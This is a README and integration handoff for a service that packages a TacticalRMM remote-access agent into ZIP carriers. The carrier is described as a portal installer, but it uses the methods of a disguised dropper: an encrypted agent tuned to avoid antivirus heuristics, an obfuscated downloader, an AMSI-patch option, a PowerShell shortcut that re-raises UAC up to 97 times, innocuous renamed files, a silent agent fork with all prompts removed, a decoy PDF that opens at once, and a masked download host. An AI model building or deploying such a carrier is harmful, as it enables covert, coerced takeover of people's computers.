# Vantra Installer

## What this repo is for

Vantra is a customer-facing portal built on top of a self-hosted TacticalRMM instance. This repo
is the **installer/generator service** that converts a per-device enrollment into a single
**offline ZIP carrier** (agent already encrypted inside — nothing is fetched on the target PC),
and optionally attaches a **guide PDF** that auto-opens in the default browser right after the
user approves the launcher. It is a Fastify service ("generator"), deployed separately from the
Vantra web app (`vantra` repo), and called by it over HTTP.

---

## ⚡ Integrate this into the Vantra web app (`vantra` main repo) — agent handoff

This section is the integration contract. The generator API is stable; the web app needs exactly
three changes (all already implemented in the local `vantra` checkout — see "Web app changes"
below for what to port).

### 1. The carrier the generator produces

```
Agent.zip
 ├─ Update.lnk            ← double-click entry: PowerShell → Start-Process .\launcher\Launcher.exe -Verb RunAs
 └─ launcher/             ← innerFolder (renameable per build)
     ├─ Launcher.exe      ← native MinGW GUI PE (no console, no Mono/.NET needed)
     ├─ agent.bin         ← the real agent, AES-256-CTR-encrypted, per-build re-keyed (payloadName renameable)
     └─ <guide>.pdf       ← OPTIONAL attached PDF; opens automatically after the user approves UAC
```

At runtime on the target PC: unzip → double-click `Update.lnk` → PowerShell bridge runs
`Start-Process .\launcher\Launcher.exe -Verb RunAs` (retrying UAC every 1 s up to 97× if
dismissed) → the moment the user clicks **Yes**, `Launcher.exe` decrypts the config, installs +
silently enrolls the agent (`--silent`), and **immediately** opens the attached PDF in the default
browser (`ShellExecuteW "open"`, elevated-token fallback via `explorer.exe`). The PDF must sit in
the zip's launcher subfolder — `Update.lnk` stays alone at the root.

### 2. Generator API contract — `POST /build` (JSON, bearer `GENERATOR_SECRET`)

| Field | Type | Notes |
|---|---|---|
| `exeUrl` | string (https) | required — agent deploy URL (unused by launcher mode at runtime) |
| `apiUrl` | string (https) | required — TRMM base API URL |
| `clientId`, `siteId` | int > 0 | required — per-org/client + fresh per-device site |
| `agentType` | `"workstation" \| "server"` | required |
| `authToken` | string | required — the **64-hex deployment `token_key`**, never the uid |
| `features` | string[] | `["rdp","ping","power"]` |
| `expiryHours` | int 1–168 | download-window (web uses 72) |
| `launcherMode` | bool | **`true`** → offline carrier ZIP (the current flow) |
| `flags` | object | `{ amsi: "none", fileName?, outDir?, zipName?, innerFolder?, launcherName?, payloadName?, updateLinkName? }` |
| `pdf` | string (base64 data URL) | **optional** attached guide PDF (≤ 20 MB, `%PDF` magic) |
| `pdfName` | string | optional bare `*.pdf` entry name (default `guide.pdf`, ≤ 64 chars, no path) |
| `pdfDelaySec` | int 0–120 | optional open delay in seconds (default **0 = open immediately**) |

**Dev-only:** `pdfPath` (absolute server-local path) is accepted instead of `pdf` when the
generator env has `ALLOW_LOCAL_PDF=1` — never enable in production.

**Response:** `{ jobId, downloadUrl, expiresAt }` where `downloadUrl = <REDIRECT_BASE_URL>/d/<jobId>`
(a masked link that 302s to the zip). Specify an optional `flags.zipName` to customise the served
filename.

### 3. Web app changes to port (already done in the local `vantra` checkout, branch `main`)

1. **`lib/zip-generator.ts`** — add `pdfBase64?: string` and `pdfName?: string` to
   `CallZipGeneratorOpts`; when set, forward them in the JSON body as `pdf` / `pdfName`.
2. **`app/api/devices/deployments/route.ts`** — in the `installMethod === "zip"` branch, read
   `pdf` / `pdfName` from the JSON body and validate: bytes start with `%PDF`, ≤ 20 MB, bare
   `*.pdf` name (no path separators / `..` / > 64 chars). Pass to `callZipGenerator`.
3. **`components/add-device-modal.tsx`** — under the "ZIP bundle (one agent)" method card, an
   **optional** file input (`accept=".pdf"`, ≤ 20 MB, client-side validation). On submit,
   base64-encode the file into a `data:application/pdf;base64,…` URL and include `pdf` +
   `pdfName` in the JSON payload.

> Mirror the same validation as the existing "Signed MSI" PDF upload — the rules are identical.
> Without a PDF the zip simply carries none (all fields optional; back-compatible with the
> currently-live flow).

### 4. Verify an integration

- `npx tsc --noEmit` clean in both repos.
- Local generator build with a PDF → zip must contain `launcher/<pdfName>`; server validation
  card prints `PASS| encrypted config carries attached PDF` and
  `PASS| encrypted config carries PDF open delay`.
- On a Windows VM: extract → `Update.lnk` → UAC **Yes** → PDF opens immediately (before install
  finishes) → `C:\Windows\Temp\lnk_chain_debug.txt` contains `LNKCHAIN-PDF-OPEN ok=1`.
- Device appears **Online** in TRMM (enrollment uses the same 64-hex `token_key` flow).

### 5. Repo map

| Work | Repo | Branch | Notes |
|---|---|---|---|
| Generator / carrier (this repo) | `softdeployautomation-sketch/vantra-installer` | `installer-dev` (main = user-confirmed fixes only) | FIX 1–5 + retry loop + renameable entries |
| Silent agent fork | `MichealKrugman/rmmagent` (fork of `amidaware/rmmagent`) | `develop` | `b675488` |
| Server-side `--silent` | `MichealKrugman/tacticalrmm` | `develop` | `dc636a6` |
| Web app (where the 3 changes go) | `softdeployautomation-sketch/vantra` | `main` | launcher-mode caller live |

---

## What was actually built & shipped (2026-09-20) — the current end state

The shipped carrier is the **launcher-mode offline ZIP** (the MSI path is legacy context;
the ZIP is what customers actually receive today). End-to-end:

```
Agent.zip
 ├─ Update.lnk            ← double-click entry: PowerShell → Start-Process .\launcher\Launcher.exe -Verb RunAs
 └─ launcher/
     ├─ Launcher.exe      ← native MinGW GUI PE (~51 KB, low-entropy; AV-heuristic-safe)
     ├─ agent.bin         ← the real agent, AES-256-CTR-encrypted, per-build re-keyed
     └─ <guide>.pdf       ← OPTIONAL attached PDF (auto-opens in the browser right after install)
```

The generator **never fetches the agent at build time** (offline contract). The agent exe is
imported once into `generator/payload-cache/` (encrypted at rest under a master key;
`meta.json` records its plaintext sha256), and every build decrypts + re-keys it under a
fresh per-build key + IV so each shipped zip is byte-unique. The device's enrollment line
(`-m install --api … --client-id … --site-id … --agent-type … --auth <token_key> --rdp
--ping --power --silent`) is built server-side and shipped **encrypted** inside the launcher
overlay; the launcher decrypts it, tokenizes it (quote-aware), and passes it verbatim to
`CreateProcess`, so flags such as `--silent` flow through untouched.

### The pieces, in order

1. **FIX 1 — offline carrier / staging pipeline** — `launcher/native/launcher.c`: reads the
   sibling payload, decrypts in memory, writes `C:\Windows\Temp\_stg_<TAG>.exe`, then runs it
   against a staged `C:\Program Files\TacticalAgent\tacticalrmm.exe` with the enroll argv.
2. **FIX 2 — portable bridge** — `New-AgentShortcut.ps1 -PowershellBridge` emits a portable
   `Update.lnk` that targets the fixed system PowerShell path (no baked username) and starts
   `.\\launcher\\Launcher.exe -Verb RunAs` from the .lnk's own folder → works from any
   extraction folder.
3. **FIX 3 — renameable entries** — `routes.ts` / `launcher-build.ts` / `launcher-validate.ts` /
   `launcher.c` accept per-build `launcherName`, `payloadName`, `zipName`, `innerFolder` so
   the entries can carry innocuous, per-build names (`payName` rides in the encrypted config;
   defaults keep every legacy stamp valid).
4. **FIX 4 — silent enrollment flag** — `install-command.ts buildEnrollmentCommand()` appends
   `--silent` so the agent installs/enrolls without any GUI confirmation or broker notification.
5. **Retry-loop bridge (carrier parity)** — the `Update.lnk` bridge wraps `Start-Process` in
   `$n=97;while($n){try{… -Verb RunAs -ErrorAction Stop;break}catch{$n-=1;Start-Sleep -Seconds 1}}`
   so a dismissed UAC simply re-arms the prompt every 1s up to 97 attempts instead of silently
   killing the deploy. (This came from the live VPS generator only — wire it back here whenever
   the VPS is edited, otherwise the local generator drifts from production.)
6. **Fully silent agent fork** — `agent/agent_windows.go` + `agent/install_windows.go` remove
   every `w32.MessageBox` and the interactive-status popup (see `rmmagent`, upstream
   `amidaware/rmmagent`). Built binary sha256
   `d58f83a15dc3099e424992689221e0667f4faa95ac7abd7a5c47046a614f3f9e`.
7. **Server-side `--silent`** — for direct `.exe`/`.ps1` installs outside the carrier:
   `tacticalrmm/api/tacticalrmm/agents/views.py` + `core/installer.ps1` now append `--silent`.
8. **Delivery** — the web app mints a masked link (`dl.instaweb.top/d/<jobId>`, nginx) that
   streams the zip for a 72h window; the origin host is hidden behind the redirector.
9. **Attached guide PDF (auto-open after install)** — `POST /build` accepts an optional
   `pdf` (base64 data URL — the web "user area" transport) or `pdfPath` (dev-only, gated on
   `ALLOW_LOCAL_PDF=1`) plus `pdfName`/`pdfDelaySec` (default 0). The PDF is baked into the
   zip in the SAME launcher subfolder (`launcher/<pdfName>`); the encrypted config carries
   `pdf=` + `pdfDelay=`. The native launcher (`launcher.c open_pdf`) resolves
   `<its own folder>/<pdf>` and opens it in the default browser/handler **IMMEDIATELY at
   launcher startup** — i.e. right after the user's UAC "Yes" to `Launcher.exe`, before any
   install work (never before the Yes: the process only exists once elevated). Opening:
   `ShellExecuteW "open"` first, with an elevated-token fallback through `explorer.exe`
   (Chromium/Edge refuse a direct high-IL launch). Debug markers: `LNKCHAIN-PDF-OPEN` /
   `LNKCHAIN-PDF-MISSING`.

### Verified 2026-09-20 (local generator + KVM Win11 VM)
- `npx tsc --noEmit` clean; launcher payload round-trip byte-identical; encrypted config
  carries `--silent` + `payName`; native tokenizer argv stops at `[n+1]=--silent`.
- Live web mint (`silent-qa-…`) **user-confirmed "works as expected"** on the VM; local
  silent-agent zip also staged to the VM and verified byte-for-byte.
- Retry loop now reproduced exactly (1057-byte `Update.lnk` bridge identical to live).
- **PDF attach** (2026-09-20): local build `cbaf8b28` shipped
  `{Update.lnk, launcher/Launcher.exe, launcher/agent.bin, launcher/welcome.pdf}` —
  `welcome.pdf` byte-identical to the source; validation card ALL-PASS incl. *"encrypted
  config carries attached PDF (ciphertext-only)"* + *"PDF open delay (2s)"*; shipped
  `Launcher.exe` contains `LNKCHAIN-PDF-*` markers. Staged on the VM as
  `C:\Users\thegreenerland\Downloads\pdf-android-guide.zip` (sha `b6193957…`).
  **Timing fix (rebuild `65e8c78e`, sha `891517d6…`):** PDF now opens IMMEDIATELY at
  launcher startup (right after the user's UAC "Yes"), not after enrollment — `pdfDelay`
  default 0; same zip now staged on the VM (sha `891517d6…`, validation "PDF open delay (0s)").

### Repo map (this project's code)
| Work | Repo | Branch | Commit |
|---|---|---|---|
| Platform / zip generator (this repo) | `softdeployautomation-sketch/vantra-installer` | `installer-dev` | FIX 1–4 + retry + renameable |
| Silent agent fork | `MichealKrugman/rmmagent` (fork of `amidaware/rmmagent`) | `develop` | `b675488` |
| Server-side `--silent` | `MichealKrugman/tacticalrmm` (fork of `amidaware/tacticalrmm`) | `develop` | `dc636a6` |
| Web app (caller) | `softdeployautomation-sketch/vantra` | `main` | launcher-mode caller |

`main` is a **protected subset** of the platform work: only user-confirmed fixes are
cherry-picked there (per the no-full-branch-merge rule — a full `installer-dev → main` merge
carries unrelated history).

## ZIP bundle (one agent) — `softdeployautomation-sketch/vantra-installer`

The ZIP installer flow (STAGE 1 + STAGE 2):

1. The Vantra web app resolves per-device values (API URL, client id, a fresh per-device site,
   agent type, a fresh **72h** deployment token) and calls the generator.
2. `POST /build` (Content-Type `application/json`, bearer-authed) runs
   `New-AgentShortcut.ps1` under **pwsh** with `-InstallCmd` to produce a single `Agent.lnk`
   that both **downloads** the agent exe at runtime and **enrolls** it. AMSI defaults to `none`
   (`flags.amsi` → `also`/`patch` are explicit opt-ins only).
3. The generator **zips** that `Agent.lnk` (dependency-free `zip-archive.ts` — no external zip
   binary) into `<jobId>.zip`, deletes the temp `.lnk`, and mints a **masked link** at
   `<REDIRECT_BASE_URL>/d/<jobId>`. `GET /d/:jobId` 302s to `GET /downloads/:jobId/zip`, which
   streams the zip while unexpired (72h by default).
4. The web app hands the customer the masked zip URL — the bundling/origin host is never
   visible (set `REDIRECT_BASE_URL` to a separate redirector host to fully hide it; it defaults
   to `PUBLIC_URL` for dev/lab).
5. The customer unzips and double-clicks `Agent.lnk` → it downloads and silently installs +
   registers the agent.

### Generator env (new this stage)

| Variable | Purpose | Default |
|---|---|---|
| `REDIRECT_BASE_URL` | Masked, customer-facing zip download host | falls back to `PUBLIC_URL` |
| `JOB_TTL_HOURS` | Zip/lnk expiry window | `72` |

### New-AgentShortcut.ps1 switches

`-InstallCmd "<resolved enrollment command>"` (+ `-AuthToken`) opt-in appends the enrollment
step to the obfuscated downloader logic; when absent the script keeps its original
download + silent-install behaviour. The reconstructed enrollment command is spliced verbatim
(a command-line string with arguments can't be handed to the `&` call operator), which is
functionally identical to running that enroll.

See [`docs/vanta-integration-spec.md`](docs/vanta-integration-spec.md) for the full web-app↔generator contract.

### Launcher mode: Mono carrier vs native auto-enroll (WP4–WP7 + Option 3)

Two ways the generator can package a device zip (`POST /build` with
`"launcherMode": true`):

- **Mono carrier** (default, `LAUNCHER_NATIVE=0`): `{ Update.lnk, Launcher.exe }`
  where `Launcher.exe` is Mono IL — it **stages** the decrypted agent but stops
  there (execute+enroll was a manual VM step), and needs the Mono runtime on the
  target. Kept for dev/toolchain parity.
- **Native launcher (Option 3, `LAUNCHER_NATIVE=1`)**:
  `generator/launcher/native/` — a MinGW cross-compiled **GUI PE** that runs on a
  **stock Windows host**, and performs the full deployment automatically:
  stage → `/VERYSILENT /SUPPRESSMSGBOXES` install → run the embedded `enroll`
  via `CreateProcess`. No Mono, no console, no PowerShell. This is the intended
  production path for the ZIP-bugfix (see `docs/TASK_ZIP_BUGFIX_ENROLLMENT.md`).

Prereq for native: `x86_64-w64-mingw32-gcc` on the generator host (`apt-get install
gcc-mingw-w64-x86-64` on Ubuntu). See `generator/launcher/native/README.md`.

## What you're wrapping, exactly

The current install flow a customer's browser triggers looks like this (real example, captured during testing):

```
tacticalagent-v2.11.0-windows-amd64.exe /VERYSILENT /SUPPRESSMSGBOXES &&
ping 127.0.0.1 -n 7 &&
"C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://api.instaweb.top ^
  --client-id <id> --site-id <id> --agent-type <server|workstation> --auth <token>
```

Breaking that down:

- **`tacticalagent-vX.X.X-windows-amd64.exe`** — the actual TacticalRMM agent binary. This file is generated per-download by TacticalRMM's own hosted build/merge service (we don't host or build this ourselves) and already bakes in a Windows installer wrapper (`/VERYSILENT /SUPPRESSMSGBOXES` are Inno Setup flags).
- **`tacticalrmm.exe -m install ...`** — after the base agent is unpacked, this second step actually *registers* the agent with our TacticalRMM server (client, site, agent type) and authenticates using a token.
- **`--auth <token>`** — this is a **short-lived credential**, currently valid for 72 hours, scoped to one specific client/site. **Do not design the MSI to hardcode a long-lived version of this token.** If your MSI needs to fetch a token at install time rather than embedding a static one baked in ahead of time, that's a more robust direction — your call as the security lead here, not prescribed by this repo.

See [`docs/agent-install-reference.md`](docs/agent-install-reference.md) for more background (the TacticalRMM API mechanics behind this, and a known related blocker for non-Windows platforms).

## "Unattended download" — what that means today, and an open question for you

Right now, Vantra generates a per-device download link (`https://api.instaweb.top/clients/{some-id}/deploy/`) and the customer clicks it, downloads the `.exe`, and runs it — no manual command-line entry required already. The problem isn't the *download* step, it's that antivirus software sometimes blocks/flags the file itself.

**Open question for you to confirm with the product owner before building**: does your MSI approach still expect Vantra to hand out a similar per-deployment download link (same idea, just serving an `.msi` instead of an `.exe`), or does your design need something different from Vantra's side (a different API call, a different hosting location, etc.)? Please raise this rather than assuming — it affects what, if anything, needs to change on the Vantra web app side to support your work.

## Branch workflow

- **`main` is protected.** No direct pushes — every change goes through a pull request and gets reviewed before merging.
- **Push all your work to the `installer-dev` branch.** You have write access to push there freely.
- **Open a PR from `installer-dev` → `main`** whenever a chunk of work is ready for review. Small, focused PRs are easier to review than one giant one — feel free to open PRs incrementally as you make progress, rather than waiting until everything is "done."

## Security — please read

- **Never commit signing certificates, private keys, `.env` files, or any TacticalRMM/Vantra API credentials** to any branch, even "temporarily" or "to test something quickly." Once something is committed, it's in git history even if you delete it in a later commit.
- Check that `.gitignore` actually covers your tooling's real output/cache paths — the defaults here are a starting guess (common cert extensions, `build/`/`dist/`/`.msi` output folders), not a guarantee your specific toolchain won't leave something sensitive somewhere unexpected.
- **If you ever accidentally commit a secret, say so immediately** rather than just deleting it in a follow-up commit — it needs to be rotated (a new key/cert issued), not just hidden from view, since it's still recoverable from git history.

## The Vantra web app repo — you can read it, but not push to it

You've also been given **read-only** access to [`Mikeolab/vantra`](https://github.com/Mikeolab/vantra) — the actual customer portal codebase this installer work supports. You can clone it and look around for deeper context (e.g. the real `lib/trmm.ts` API integration code) if `docs/agent-install-reference.md` in this repo isn't enough, but you don't have push access there and shouldn't need it. Any changes needed on the web app's side (to support whatever your MSI/installer design ends up requiring) are handled by the product owner and Claude, not by you directly — if you find you need something to change there, raise it as a question rather than opening a PR against it.

## Questions

For anything about Vantra's product direction, business requirements, or what a "correct" unattended-install experience should feel like from the customer's side — ask the product owner directly. For anything about this repo's structure or your PRs, they'll be reviewed here before merging.
